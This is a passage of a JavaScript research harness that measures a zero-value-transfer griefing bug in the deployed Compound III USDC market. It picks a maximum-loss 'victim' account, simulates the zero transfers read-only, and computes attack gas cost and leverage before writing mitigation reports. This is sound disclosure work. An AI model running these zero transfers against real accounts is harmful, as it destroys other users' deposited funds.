**${exposure.enumeratedNonFixedPositiveAccounts}** were non-fixed at the pin.\n- One independent zero call per enumerated non-fixed account produces exactly **${exposure.enumeratedOneIndependentCallLossRaw} raw / ${formatUnits(exposure.enumeratedOneIndependentCallLossRaw, 6)} nominal USDC** of snapshot loss for the discovered universe. Market-wide exposure is **at least** these enumerated counts and loss; these are not complete-market totals.\n- \`totalSupplyBase - enumerated positive principal\` was **${exposure.totalSupplyBaseMinusEnumeratedPositivePrincipal} raw principal**. It is not proof of total-market residue, hostile attribution, a reserve balance, or attacker-capturable value.\n- Counterfactual fixed-index arithmetic over the enumerated universe is ${exposure.counterfactualCallsToEnumeratedFixedPoints} calls / ${formatUnits(exposure.enumeratedCounterfactualFixedPointClaimLossRaw, 6)} nominal USDC. This is not an executable same-index forecast because later blocks change the index, period, and residues.\n\n## Corrected gas scenario\n\nThe measured scenario is **unbatched independent calls**: **${gas.independentCallEstimateGas} gas × ${gas.enumeratedIndependentCalls} = ${gas.unbatchedIndependentCallGas} gas**, with the recorded conservative price assumptions producing **$${scenario.nominalCostUsd}** cost against **$${scenario.nominalLossUsd}** enumerated snapshot loss, or **${scenario.griefLeveragePpm} ppm**. This is not an optimized campaign estimate or block bound. Optimized batching could reuse the source checkpoint, perform one global accrual per block, warm storage, and add wrapper overhead; no optimized campaign gas or block-capacity bound was measured.\n\n## Preconditions, caveats, and mitigation\n\nPreconditions are transfers unpaused, a positive non-fixed destination principal, and attacker-paid gas. Current reward speeds/inventory show reward context, but exact reward-token liability was not attributed. Physical backing deficit, reserve capture, and direct attacker payout remain unproven. Provider backend independence is unproven; no runtime equivalence claim was made; no account identities, endpoints, raw responses, keys, forks, state overrides, or live actions were persisted or used by the correction.\n\nLocal source continuity remains at \`CometWithExtendedAssetList.sol:848-887\`. Make zero-value base destination operations preserve destination principal across supply and internal-transfer surfaces while deliberately retaining intended accrual and reward checkpoints. Historical reconciliation is secondary and cannot replace the destination no-op.\n\n## Decision\n\nRetain as Low and **currently reachable at the finalized pin**. Impact is \`2/5\`, extraction is \`0/5\`, and gates remain \`0/0/false\`. ${raw.reopenTrigger}\n`;
}

function renderInbox(raw) {
  const exposure = raw.matchingEventDerivedUniverseExposure;
  return canonical({ findingId: NAME, runId: raw.runId, agentId: AGENT, role: "critical-research", status: "deployed-low-grief-confirmed-at-finalized-pin", classification: raw.classification, impactPrimitivePipeline: "2/5", financialExtractionPipeline: "0/5", routePositive: 0, executableNow: 0, signedActionJustified: false, fork: false, summary: `${exposure.discoveredCandidateAccounts} discovered candidates; ${exposure.enumeratedPositiveSupplyAccounts} positive/non-fixed enumerated accounts and ${exposure.enumeratedOneIndependentCallLossRaw} raw one-call loss are exact for the matching discovered universe and market-wide lower bounds, not complete totals.`, evidence: { pin: raw.endpointCoverage.fixedFinalizedPin, scope: raw.historicalCoverage.scopeStatement, historicalLogRows: raw.historicalCoverage.logRows, matchingEventDerivedUniverseExposure: exposure, gasMateriality: raw.gasMateriality }, correctionActivity: raw.offlineCorrectionActivity || null, artifacts: [RAW, TESTS, LEAK, MANIFEST, REPORT, RUNNER, TESTER, VALIDATOR, HANDOFF], nextAction: raw.reopenTrigger });
}

function renderHandoff(raw) {
  const pin = raw.endpointCoverage.fixedFinalizedPin, history = raw.historicalCoverage, exposure = raw.matchingEventDerivedUniverseExposure, gas = raw.gasMateriality;
  return `# Compound Comet zero-transfer grief Step 2 handoff\n\n- ${raw.classification}; impact 2/5; extraction 0/5; gates 0/0/false.\n- Finalized pin ${pin.number} / ${pin.hash}; behavior is currently reachable at that pin.\n- Matching event-derived universe only: ${history.discoveredCandidateAccounts} discovered candidates from ${history.logRows} matching rows under stated RPC/event assumptions; no complete-market/history claim.\n- Enumerated exact/lower-bound facts: ${exposure.enumeratedPositiveSupplyAccounts} positive, ${exposure.enumeratedNonFixedPositiveAccounts} non-fixed, ${exposure.enumeratedOneIndependentCallLossRaw} raw one-independent-call loss.\n- The ${exposure.totalSupplyBaseMinusEnumeratedPositivePrincipal}-raw figure is totalSupplyBase minus enumerated positive principal, not total-market or hostile residue attribution.\n- Unbatched independent-call scenario: ${gas.independentCallEstimateGas} gas × ${gas.enumeratedIndependentCalls} = ${gas.unbatchedIndependentCallGas} gas and $${gas.unbatchedIndependentCallScenario.nominalCostUsd}; optimized campaign gas/block bounds were not measured.\n- Fixed-index convergence remains counterfactual; runtime/provider/reward/reserve/privacy caveats remain.\n- Offline correction used zero RPC, endpoint reads, secrets, forks, state overrides, or live actions.\n- Reopen: ${raw.reopenTrigger}\n`;
}

function scanGeneratedForLeaks(paths) {
  const findings = [];
  for (const rel of paths) {
    const body = text(rel);
    if (/(?:https?|wss?):\/\//i.test(body)) findings.push({ path: rel, category: "url" });
    else if (/0x[0-9a-f]{40}(?![0-9a-f])/i.test(body)) findings.push({ path: rel, category: "address" });
  }
  return canonical({ schemaVersion: 2, passed: findings.length === 0, findingCount: findings.length, findings, scope: paths, endpointUrlsDomainsHeadersKeysPersisted: false, rawRpcResponsesPersisted: false, accountOrTargetAddressesPersisted: false, secretInventoriesReadDuringCorrection: 0 });
}

function packageCorrected(raw) {
  const tests = runTests();
  write(RAW, `${JSON.stringify(raw, null, 2)}\n`);
  write(TESTS, `${JSON.stringify(canonical(tests), null, 2)}\n`);
  write(REPORT, renderReport(raw));
  write(INBOX, `${JSON.stringify(renderInbox(raw), null, 2)}\n`);
  write(HANDOFF, renderHandoff(raw));
  const generated = [RAW, TESTS, REPORT, INBOX, HANDOFF], leak = scanGeneratedForLeaks(generated);
  write(LEAK, `${JSON.stringify(leak, null, 2)}\n`);
  if (!leak.passed) throw new Error("leak-scan-failed");
  const records = [RUNNER, TESTER, VALIDATOR, STEP1, VULNERABLE_SOURCE, MIGRATION_SOURCE, ROOTS, CONFIG, RAW, TESTS, LEAK, REPORT, INBOX, HANDOFF].map(hashFile), aggregateSha256 = aggregateHash(records);
  const manifest = canonical({ schemaVersion: 2, revision: raw.revision, runId: raw.runId, generatedAt: raw.generatedAt, evidenceCapturedAt: raw.evidenceCapturedAt, classification: raw.classification, aggregateSha256, records, fixedFinalizedPin: raw.endpointCoverage.fixedFinalizedPin, sourceContinuity: raw.sourceContinuity, deployment: raw.deployment, historicalCoverage: raw.historicalCoverage, matchingEventDerivedUniverseExposure: raw.matchingEventDerivedUniverseExposure, readOnlyBehavior: raw.readOnlyBehavior, gasMateriality: raw.gasMateriality, gates: raw.gates, pipelines: raw.pipelines, activityScope: raw.activityScope, offlineCorrectionActivity: raw.offlineCorrectionActivity, tests: { artifact: hashFile(TESTS), deterministicCases: tests.deterministicCases, fuzzCases: tests.fuzzCases, passed: tests.passed }, leakScan: hashFile(LEAK), reopenTrigger: raw.reopenTrigger });
  write(MANIFEST, `${JSON.stringify(manifest, null, 2)}\n`);
  return { tests, aggregateSha256 };
}

async function offlineCorrect() {
  stage = "offline-oracle-correction";
  const raw = applyOracleCorrections(json(RAW)), result = packageCorrected(raw), exposure = raw.matchingEventDerivedUniverseExposure;
  process.stdout.write(`${JSON.stringify({ ok: true, offlineOnly: true, newRpcRequests: 0, endpointInventoryReads: 0, runId: raw.runId, classification: raw.classification, discoveredCandidateAccounts: exposure.discoveredCandidateAccounts, enumeratedPositiveSupplyAccounts: exposure.enumeratedPositiveSupplyAccounts, enumeratedNonFixedPositiveAccounts: exposure.enumeratedNonFixedPositiveAccounts, enumeratedOneIndependentCallLossRaw: exposure.enumeratedOneIndependentCallLossRaw, unbatchedIndependentCallGas: raw.gasMateriality.unbatchedIndependentCallGas, unbatchedNominalCostUsd: raw.gasMateriality.unbatchedIndependentCallScenario.nominalCostUsd, griefLeveragePpm: raw.gasMateriality.unbatchedIndependentCallScenario.griefLeveragePpm, tests: `${result.tests.deterministicCases}+${result.tests.fuzzCases}`, aggregateSha256: result.aggregateSha256 })}\n`);
}

async function main() {
  stage = "preflight";
  for (const rel of [RAW, TESTS, LEAK, MANIFEST, REPORT, INBOX, HANDOFF]) if (fs.existsSync(abs(rel))) fs.rmSync(abs(rel), { force: true });
  const claim = json(CLAIM);
  if (claim.status !== "active" || claim.resource !== "target-compound-comet-zero-transfer-griefing-step2" || claim.agentId !== AGENT || Date.parse(claim.expiresAt) <= Date.now()) throw new Error("active-claim-invalid");
  const roots = json(ROOTS), config = json(CONFIG), cometAddress = lower(roots.comet), configuratorAddress = lower(roots.configurator), rewardsAddress = lower(roots.rewards), baseTokenLocal = lower(config.baseTokenAddress);
  if (![cometAddress, configuratorAddress, rewardsAddress, baseTokenLocal].every(isAddress)) throw new Error("local-deployment-artifact-invalid");

  stage = "inventory-and-pin";
  const inventory = parseInventories(), qualification = await qualify(inventory, cometAddress), { selected, pin, pinHash, header } = qualification;

  stage = "deployment-binding";
  const cometProxy = await proxyEvidence(selected, cometAddress, pin), configuratorProxy = await proxyEvidence(selected, configuratorAddress, pin);
  const cometFirstCode = await firstCodeBlock(selected[0].row, cometAddress, pin);
  const implementationFirstCode = cometProxy.slots.implementation ? await firstCodeBlock(selected[0].row, cometProxy.slots.implementation, pin) : null;
  const baseToken = lower((await readFunction(selected, cometAddress, COMET, "baseToken", [], pin))[0]);
  const governor = lower((await readFunction(selected, cometAddress, COMET, "governor", [], pin))[0]);
  const pauseGuardian = lower((await readFunction(selected, cometAddress, COMET, "pauseGuardian", [], pin))[0]);
  const extension = lower((await readFunction(selected, cometAddress, COMET, "extensionDelegate", [], pin))[0]);
  const assetList = lower((await readFunction(selected, cometAddress, COMET, "assetList", [], pin))[0]);
  const extensionCodes = await Promise.all(selected.map((item) => rpc(item.row, "eth_getCode", [extension, hex(pin)]))), assetListCodes = await Promise.all(selected.map((item) => rpc(item.row, "eth_getCode", [assetList, hex(pin)])));
  if (new Set(extensionCodes.map(lower)).size !== 1 || new Set(assetListCodes.map(lower)).size !== 1) throw new Error("delegate-code-disagreement");
  const deployment = {
    market: "Ethereum Mainnet Compound III USDC",
    localRootsArtifactMatched: true,
    baseTokenMatchesLocalConfiguration: baseToken === baseTokenLocal,
    governorMatchesLocalConfiguration: governor === lower(config.governor),
    pauseGuardianMatchesLocalConfiguration: pauseGuardian === lower(config.pauseGuardian),
    cometProxy: cometProxy.output,
    configuratorProxy: configuratorProxy.output,
    cometFirstCodeBlock: cometFirstCode,
    currentImplementationFirstCodeBlock: implementationFirstCode,
    extensionDelegateHasCode: extensionCodes[0] !== "0x",
    extensionDelegateRuntimeKeccak256: extensionCodes[0] === "0x" ? null : keccak256(extensionCodes[0]),
    extendedAssetListNonzero: assetList !== ZERO,
    extendedAssetListHasCode: assetListCodes[0] !== "0x",
  };

  stage = "current-state";
  const totalsRaw = await readFunction(selected, cometAddress, COMET, "totalsBasic", [], pin), totals = totalsRaw[0];
  const totalSupply = BigInt((await readFunction(selected, cometAddress, COMET, "totalSupply", [], pin))[0]);
  const totalBorrow = BigInt((await readFunction(selected, cometAddress, COMET, "totalBorrow", [], pin))[0]);
  const reserves = BigInt((await readFunction(selected, cometAddress, COMET, "getReserves", [], pin))[0]);
  const pause = {};
  for (const fn of ["isSupplyPaused", "isTransferPaused", "isWithdrawPaused", "isAbsorbPaused", "isBuyPaused"]) pause[fn] = Boolean((await readFunction(selected, cometAddress, COMET, fn, [], pin))[0]);
  const trackingSupplySpeed = BigInt((await readFunction(selected, cometAddress, COMET, "baseTrackingSupplySpeed", [], pin))[0]);
  const trackingBorrowSpeed = BigInt((await readFunction(selected, cometAddress, COMET, "baseTrackingBorrowSpeed", [], pin))[0]);
  const baseMinForRewards = BigInt((await readFunction(selected, cometAddress, COMET, "baseMinForRewards", [], pin))[0]);
  const accrual = await accrueProbe(selected, cometAddress, pin);

  stage = "historical-account-universe";
  const histories = await Promise.all(selected.map((item) => scanHistory(item.row, cometAddress, cometFirstCode, pin)));
  if (histories[0].logCommitment !== histories[1].logCommitment || histories[0].accountCommitment !== histories[1].accountCommitment || histories[0].logs !== histories[1].logs) throw new Error("historical-log-family-disagreement");
  const principalCapture = await capturePrincipals(selected, cometAddress, histories[0].accounts, pin);
  const exposure = aggregateExposure(accrual.effectiveSupplyIndex, principalCapture.principals);
  const period = fixedPeriod(accrual.effectiveSupplyIndex);
  const positivePrincipalGap = BigInt(totals.totalSupplyBase) - exposure.sumPositivePrincipal;

  stage = "behavioral-probes";
  let victimIndex = -1, victimLoss = -1n;
  for (let i = 0; i < principalCapture.principals.length; i++) {
    const principal = principalCapture.principals[i]; if (principal <= 0n || principal % period === 0n) continue;
    const fixed = principal - principal % period, loss = principal * accrual.effectiveSupplyIndex / SCALE - fixed * accrual.effectiveSupplyIndex / SCALE;
    if (loss > victimLoss) { victimLoss = loss; victimIndex = i; }
  }
  let transferProbe = { callSuccess: false, sourcePrincipalZero: accrual.sourcePrincipalZero, victimPrincipalDecrement: null, aggregateSupplyPrincipalUnchanged: null, effectiveSupplyIndex: accrual.effectiveSupplyIndex.toString() };
  let transferAssetProbe = { ...transferProbe }, gas = { available: false, values: [] };
  if (victimIndex >= 0 && !pause.isTransferPaused) {
    const victim = histories[0].accounts[victimIndex];
    transferProbe = await zeroTransferProbe(selected, cometAddress, baseToken, victim, pin, "transfer");
    transferAssetProbe = await zeroTransferProbe(selected, cometAddress, baseToken, victim, pin, "transferAsset");
    gas = await gasEstimate(selected, cometAddress, victim, pin);
  }
  const behaviorConfirmed = transferProbe.callSuccess && transferProbe.sourcePrincipalZero && transferProbe.victimPrincipalDecrement === "1" && transferProbe.aggregateSupplyPrincipalUnchanged && transferAssetProbe.callSuccess && transferAssetProbe.sourcePrincipalZero && transferAssetProbe.victimPrincipalDecrement === "1" && transferAssetProbe.aggregateSupplyPrincipalUnchanged;

  stage = "reward-and-economics";
  // The long-lived Rewards deployment may expose either the original
  // 3-word getter or the later 4-word getter with multiplier. Decode both
  // layouts explicitly instead of overstating source/runtime continuity.
  const rewardConfigBytes = await callBoth(selected, rewardsAddress, REWARDS.encodeFunctionData("rewardConfig", [cometAddress]), pin);
  const rewardWords = (rewardConfigBytes.length - 2) / 64;
  if (rewardWords !== 3 && rewardWords !== 4) throw new Error("reward-config-layout-unrecognized");
  const rewardConfigRaw = coder.decode(rewardWords === 4 ? ["address", "uint64", "bool", "uint256"] : ["address", "uint64", "bool"], rewardConfigBytes), rewardToken = lower(rewardConfigRaw[0]);
  let reward = { configured: rewardToken !== ZERO, getterWords: rewardWords, rescaleFactor: BigInt(rewardConfigRaw[1]).toString(), shouldUpscale: Boolean(rewardConfigRaw[2]), multiplier: rewardWords === 4 ? BigInt(rewardConfigRaw[3]).toString() : null, inventoryRaw: null, tokenDecimals: null, supplyTrackingActive: trackingSupplySpeed > 0n, borrowTrackingActive: trackingBorrowSpeed > 0n };
  if (reward.configured) {
    reward.inventoryRaw = BigInt((await readFunction(selected, rewardToken, ERC20, "balanceOf", [rewardsAddress], pin))[0]).toString();
    reward.tokenDecimals = Number((await readFunction(selected, rewardToken, ERC20, "decimals", [], pin))[0]);
  }
  const price = await priceEvidence(selected, pin), baseFee = BigInt(header.baseFeePerGas || "0x0"), conservativeGasPriceWei = baseFee * 2n + 1_000_000_000n;
  const gasUnits = gas.available ? gas.maximum : null;
  const onePassEconomics = gasEconomics(BigInt(exposure.nonFixedPositiveAccounts), gasUnits, conservativeGasPriceWei, price, exposure.sumOneCallClaimLossRaw);
  const convergenceEconomics = gasEconomics(exposure.callsToAllFixedPoints, gasUnits, conservativeGasPriceWei, price, exposure.sumFixedPointClaimLossRaw);

  stage = "terminal-and-package";
  const terminal = await Promise.all(selected.map((item) => rpc(item.row, "eth_getBlockByNumber", [hex(pin), false], 12000)));
  const terminalRecheck = terminal.every((item) => lower(item.hash) === pinHash); if (!terminalRecheck) throw new Error("terminal-recheck-failed");
  const tests = runTests(); write(TESTS, `${JSON.stringify(canonical(tests), null, 2)}\n`);
  const currentReachable = behaviorConfirmed && !pause.isTransferPaused && exposure.nonFixedPositiveAccounts > 0;
  const classification = currentReachable ? "LOW/CURRENTLY-REACHABLE-AT-FINALIZED-PIN/PERMISSIONLESS-ACCOUNT-CLAIM-GRIEFING/PHANTOM-AGGREGATE-RESIDUE/NO-DIRECT-ATTACKER-PAYOUT" : pause.isTransferPaused ? "LOW/BLOCKED-BY-TRANSFER-PAUSE/PERMISSIONLESS-ACCOUNT-CLAIM-GRIEFING/NO-DIRECT-ATTACKER-PAYOUT" : "LOW/DORMANT-AT-PIN/NO-NONFIXED-SUPPLY-PRINCIPAL/NO-DIRECT-ATTACKER-PAYOUT";
  const generatedAt = new Date().toISOString();
  const scopedExposure = scopeEventDerivedExposure(exposure, BigInt(totals.totalSupplyBase));
  const raw = canonical({
    schemaVersion: 2, revision: "oracle-scope-and-gas-corrections-offline-ready-r2", generatedAt, runId: `${NAME}-${digest({ pinHash, deployment, scopedExposure, transferProbe, transferAssetProbe })}`, agentId: AGENT, role: "critical-research", classification,
    pipelines: { impactPrimitive: "2/5", financialExtraction: "0/5", deploymentBound: true, behaviorConfirmed, matchingEventDerivedUniverseAtPin: true, completeHistoricalExposureAtPin: false, marketWideCompletenessEstablished: false, directAttackerPayoutDemonstrated: false, forkProof: false, liveExecution: false },
    gates: { routePositive: 0, executableNow: 0, signedActionJustified: false },
    endpointCoverage: { chainId: CHAIN_ID, inventoriesRead: INVENTORIES.length, inventoryCandidateCount: inventory.candidateCount, inventoryFamilyCount: inventory.familyCount, responsiveProviderCount: qualification.responsiveProviders, responsiveHostnameDerivedFamilyCount: qualification.responsiveFamilies, selectedHostnameDerivedFamilies: 2, backendOperatorIndependenceEstablished: false, fixedFinalizedPin: { number: pin, hash: pinHash, terminalRecheck }, endpointMaterialPersisted: false, rawResponsesPersisted: false, accountAddressesPersisted: false },
    sourceContinuity: { repository: "targets/compound-comet", commit: SOURCE_COMMIT, vulnerableSource: { path: VULNERABLE_SOURCE, sha256: hashFile(VULNERABLE_SOURCE).sha256, lines: [848, 866, 877, 880, 883, 886, 887] }, migrationSource: { path: MIGRATION_SOURCE, sha256: hashFile(MIGRATION_SOURCE).sha256, lines: [25, 27, 135, 139, 153, 157, 171, 175, 212, 215, 220, 222] }, localDeploymentArtifacts: [hashFile(ROOTS), hashFile(CONFIG)], runtimeEquivalenceEstablished: false, equivalenceReason: "No reproducible immutable/metadata normalization was performed; deployment binding relies on official local roots/migration continuity plus direct fixed-pin read-only behavior.", currentImplementationBehaviorConfirmedByReadOnlySimulation: behaviorConfirmed },
    deployment,
    currentState: { storedSupplyIndex: BigInt(totals.baseSupplyIndex).toString(), effectiveSupplyIndexAtPin: accrual.effectiveSupplyIndex.toString(), fixedPointPeriodPrincipal: period.toString(), totalSupplyBase: BigInt(totals.totalSupplyBase).toString(), totalBorrowBase: BigInt(totals.totalBorrowBase).toString(), totalSupplyPresentRaw: totalSupply.toString(), totalBorrowPresentRaw: totalBorrow.toString(), reservesRaw: reserves.toString(), pause, tracking: { baseTrackingSupplySpeed: trackingSupplySpeed.toString(), baseTrackingBorrowSpeed: trackingBorrowSpeed.toString(), baseMinForRewards: baseMinForRewards.toString() } },
    historicalCoverage: { fromProxyFirstCodeBlock: cometFirstCode, firstCodeBoundarySelectedFamilyDerived: true, fullImplementationLineageProven: false, eventEmissionCompletenessProven: false, toFixedFinalizedBlock: pin, twoFamilyMatchingLogAgreement: true, logRows: histories[0].logs, requestedTopLevelChunksPerFamily: histories[0].chunks, discoveredCandidateAccounts: histories[0].accounts.length, logCommitment: histories[0].logCommitment, accountUniverseCommitment: histories[0].accountCommitment, userStateCommitment: principalCapture.stateCommitment, userStateChunksPerFamily: principalCapture.chunks, accountAddressesPersisted: false, scopeStatement: "Matching event-derived universe under stated RPC/event-coverage assumptions; no cryptographic proof of complete market history, implementation lineage, or event-emission completeness." },
    matchingEventDerivedUniverseExposure: scopedExposure,
    readOnlyBehavior: { mechanism: "A single Multicall3 eth_call performs pre-read, zero transfer, and post-read in one reverted simulation context; no state override or transaction is used.", transfer: transferProbe, transferAsset: transferAssetProbe, behaviorConfirmed, selectedAccountIdentityPersisted: false, selectedAccountIndividualBalancePersisted: false },
    reward,
    gasMateriality: { scenario: "UNBATCHED_INDEPENDENT_CALLS", estimateAvailable: gas.available, twoFamilyEstimateValues: gas.available ? gas.values.map(String) : [], exactEstimateAgreement: gas.available ? gas.exactAgreement : null, independentCallEstimateGas: gasUnits === null ? null : gasUnits.toString(), enumeratedIndependentCalls: exposure.nonFixedPositiveAccounts, unbatchedIndependentCallGas: gasUnits === null ? null : (gasUnits * BigInt(exposure.nonFixedPositiveAccounts)).toString(), baseFeeWei: baseFee.toString(), conservativeGasPriceWei: conservativeGasPriceWei.toString(), ethUsdReferenceAvailable: price.available, ethUsdAtPin: price.available ? formatUnits(price.answer, price.decimals, 4) : null, unbatchedIndependentCallScenario: onePassEconomics, optimizedCampaignMeasured: false, optimizedCampaignCaveat: "Optimized batching could reuse the source checkpoint, perform one global accrual per block, warm storage, and add wrapper overhead; no optimized campaign gas or block-capacity bound was measured.", counterfactualFixedIndexConvergence: convergenceEconomics, counterfactualWarning: "The fixed-index convergence sum is not an executable same-index forecast; later blocks change the index, period, and residues.", nominalAssumption: "USDC raw units valued at $1 per 1e6 solely for grief-cost comparison; no attacker revenue is assigned." },
    economics: { attackerBaseGainRaw: "0", attackerCollateralGainRaw: "0", attackerRewardGainRaw: "0", directPayoutDemonstrated: false, physicalBackingDeficitDemonstrated: false, aggregateResiduePotential: true, routePositive: 0 },
    limitations: ["No bytecode/source equivalence claim: immutable and metadata normalization was not reproduced.", "Hostname-derived provider families do not prove backend operator independence.", "Exposure is exact only for the matching event-derived discovered universe and is a market-wide lower bound, not a complete market total.", "The first-code boundary was selected-family-derived; full implementation lineage and event-emission completeness were not proven.", "Exposure is a fixed-pin snapshot; later interest-index changes alter the fixed-point period and account residues.", "The counterfactual fixed-index convergence sum is not an executable same-index loss forecast.", "Gas figures are an unbatched independent-call scenario; optimized campaign gas and block capacity were not measured.", "The 73-raw difference is totalSupplyBase minus enumerated positive principal, not proven total-market residue or hostile attribution.", "Reward inventory/speed are context, not exact token liability; reserve capture and direct attacker payout remain unproven.", "No account identities, endpoint material, or raw responses were persisted."],
    activityScope: { readOnlyInventoryReads: INVENTORIES.length, rpcRequests, graphqlRequests, ethCalls: true, ethEstimateGas: gas.available, liveSignedTransactions: 0, broadcasts: 0, localTransactions: 0, stateOverrides: 0, forkCreated: false, productionMutation: false, realFundsUsed: false, keyFilesRead: 0, endpointMaterialPersisted: false, rawResponsesPersisted: false, accountAddressesPersisted: false },
    reopenTrigger: "Recompute after any implementation upgrade, transfer-pause change, material index/account-set change, or reward-speed change; escalate financial impact only if residue becomes attacker-capturable or another direct payout path is proven.",
  });
  write(RAW, `${JSON.stringify(raw, null, 2)}\n`);

  // Retained only as unreachable legacy text for reproducibility of the first
  // packaging revision; corrected renderers below are the emitted schema.
  if (false) {
  const reportSignal = currentReachable ? "🟡 VULNERABLE" : "🟢 DORMANT";
  write(REPORT, `# ${reportSignal} — Compound Comet zero-transfer account-claim grief Step 2\n\n**Classification:** \`${classification}\`  \n**Impact primitive:** \`2/5\`; **financial extraction:** \`0/5\`; **gates:** \`0/0/false\`; **fork/live actions:** \`false\`.\n\n## Result\n\nAt finalized Ethereum pin \`${pin}\` / \`${pinHash}\`, two hostname-derived RPC families agreed the header, proxy slots/code, all ${histories[0].logs} relevant market logs from deployment, ${histories[0].accounts.length} event-derived account candidates, current account state, and a terminal same-number hash recheck. No endpoint, raw response, or account address was persisted.\n\nThe current implementation is behaviorally affected: a read-only Multicall3 simulation observed both \`transfer(dst, 0)\` and \`transferAsset(dst, base, 0)\` lower an anonymized positive destination principal by exactly one while leaving \`totalSupplyBase\` unchanged. Transfers were ${pause.isTransferPaused ? "paused" : "unpaused"} at the pin. This binds the Step 1 primitive to deployed behavior without claiming exact local-source/runtime bytecode equivalence.\n\n## Aggregate exposure and materiality\n\n- Positive suppliers: **${exposure.positiveSupplyAccounts}**; non-fixed positive suppliers: **${exposure.nonFixedPositiveAccounts}**.\n- Effective supply index: \`${accrual.effectiveSupplyIndex}\`; fixed-point period: \`${period}\` principal units.\n- The fixed-pin snapshot sum for one zero call per non-fixed supplier is **${formatUnits(exposure.sumOneCallClaimLossRaw, 6)} nominal USDC**. At ${maxEstimatedCallsPerBlock ?? "unknown"} estimated calls/block this spans at least ${minimumBlocks(BigInt(exposure.nonFixedPositiveAccounts)) ?? "unknown"} blocks, so the index will change during any attempted portfolio-wide pass.\n- Counterfactual fixed-index convergence arithmetic is **${exposure.callsToAllFixedPoints} calls / ${formatUnits(exposure.sumFixedPointClaimLossRaw, 6)} nominal USDC**. It is **not an executable same-index loss forecast**: the call count exceeds block capacity and later blocks change the index, period, and residues.\n- Aggregate \`totalSupplyBase - sum(positive account principal)\`: \`${positivePrincipalGap}\` raw principal at the pin. This snapshot gap is evidence of aggregate/account divergence, not proof that all of it arose from hostile zero transfers.\n- Conservative gas estimate: **${gasUnits === null ? "unavailable" : `${gasUnits} gas/call`}**. Snapshot one-pass nominal grief/cost: **$${onePassEconomics.nominalLossUsd} / ${onePassEconomics.nominalCostUsd === null ? "cost unavailable" : `$${onePassEconomics.nominalCostUsd}`}**; leverage ${onePassEconomics.griefLeveragePpm === null ? "unavailable" : `${onePassEconomics.griefLeveragePpm} ppm`}.\n- Current supply reward speed is nonzero (\`${trackingSupplySpeed}\`) and the reward pool inventory is \`${reward.inventoryRaw ?? "unavailable"}\` raw at ${reward.tokenDecimals ?? "unknown"} decimals. Thus Step 1's future reward-weight reduction is configured, but exact token liability/loss was not attributed and no attacker reward, base, or collateral payout was demonstrated.\n\n## Preconditions, impact, and evidence\n\nPreconditions are: transfers unpaused; a positive destination principal not divisible by \`S/gcd(I,S)\`; and attacker willingness to pay gas. The impact is involuntary reduction of the victim's base claim and phantom aggregate principal. Physical backing remains in Comet, ordinary reserve accounting did not become attacker-owned in Step 1, and this pass performed no signed action, mutation, state override, or fork.\n\nEvidence is in \`${RAW}\`, with account-universe and state commitments rather than identities. Local source continuity is at commit \`${SOURCE_COMMIT}\`: \`CometWithExtendedAssetList.sol:848-887\` performs the zero-amount destination round trip and preserves aggregate totals when the destination principal falls; the official migration at \`1735299739_update_comet_to_support_more_collaterals.ts:25-28,135-175,212-222\` deploys/uses the extended-asset-list factory and verifies \`assetList()\`. Exact runtime equivalence is deliberately **not** claimed because immutable/metadata normalization was not reproduced.\n\n## Mitigation and defensive tests\n\nMake zero-value base destination operations preserve the destination's stored principal across both supply and internal-transfer surfaces while deliberately retaining intended global accrual and reward-checkpoint semantics. Add deployed-implementation regression tests for both entry points, non-fixed/fixed principals, changing indices, pause behavior, prior/future rewards, aggregate principal, reserves, and upgrade migration. Historical residue reconciliation is secondary and cannot replace the destination no-op.\n\n## Decision\n\nRetain as Low deployed account-claim grief/accounting residue. The route is currently reachable at the pin only as a costly victim-loss primitive, not an extraction route; \`routePositive=0\`, \`executableNow=0\`, and \`signedActionJustified=false\`. ${raw.reopenTrigger}\n`);

  const inbox = canonical({ findingId: NAME, runId: raw.runId, agentId: AGENT, role: "critical-research", status: currentReachable ? "deployed-low-grief-confirmed" : "dormant-or-blocked", classification, impactPrimitivePipeline: "2/5", financialExtractionPipeline: "0/5", routePositive: 0, executableNow: 0, signedActionJustified: false, fork: false, summary: `${exposure.nonFixedPositiveAccounts} anonymized non-fixed positive suppliers at the fixed pin; read-only deployed behavior confirmation=${behaviorConfirmed}; no direct attacker payout.`, evidence: { pin: raw.endpointCoverage.fixedFinalizedPin, historicalLogRows: histories[0].logs, candidateAccounts: histories[0].accounts.length, aggregateExposure: raw.aggregateExposure, gasMateriality: raw.gasMateriality }, artifacts: [RAW, TESTS, LEAK, MANIFEST, REPORT, RUNNER, TESTER, VALIDATOR, HANDOFF], nextAction: raw.reopenTrigger });
  write(INBOX, `${JSON.stringify(inbox, null, 2)}\n`);
  write(HANDOFF, `# Compound Comet zero-transfer grief Step 2 handoff\n\n- ${classification}; impact primitive 2/5; extraction 0/5; gates 0/0/false.\n- Finalized Ethereum pin ${pin} / ${pinHash}; two hostname-derived families and terminal recheck agree; backend independence unproven.\n- Complete agreed event-derived candidate universe: ${histories[0].accounts.length} accounts from ${histories[0].logs} relevant logs; identities were never persisted.\n- Positive suppliers ${exposure.positiveSupplyAccounts}; non-fixed ${exposure.nonFixedPositiveAccounts}; one-pass loss ${formatUnits(exposure.sumOneCallClaimLossRaw, 6)} nominal USDC; fixed-index convergence loss ${formatUnits(exposure.sumFixedPointClaimLossRaw, 6)} nominal USDC over ${exposure.callsToAllFixedPoints} calls.\n- Read-only same-call pre/post simulation confirmed both zero-value entry points decrement principal by one and leave aggregate supply principal unchanged: ${behaviorConfirmed}.\n- Runtime/source equivalence is not claimed; official artifact/migration continuity plus deployed behavior is the binding.\n- No fork, state override, key, signature, transaction, broadcast, account address persistence, or endpoint persistence.\n- Reopen: ${raw.reopenTrigger}\n`);

  }
  write(REPORT, renderReport(raw));
  const correctedInbox = renderInbox(raw);
  write(INBOX, `${JSON.stringify(correctedInbox, null, 2)}\n`);
  write(HANDOFF, renderHandoff(raw));

  stage = "leak-scan";
  const generated = [RAW, TESTS, REPORT, INBOX, HANDOFF], findings = [];
  function strings(value, out = []) { if (typeof value === "string") out.push(value); else if (Array.isArray(value)) for (const item of value) strings(item, out); else if (value && typeof value === "object") for (const item of Object.values(value)) strings(item, out); return out; }
  for (const rel of generated) {
    const values = rel.endsWith(".json") ? strings(json(rel)) : text(rel).split(/\r?\n/);
    for (const value of values) {
      const body = lower(value);
      if (/(?:https?|wss?):\/\//i.test(body)) { findings.push({ path: rel, category: "url" }); break; }
      if ([...inventory.secrets].some((secret) => secret.length > 5 && body.includes(secret))) { findings.push({ path: rel, category: "inventory-material" }); break; }
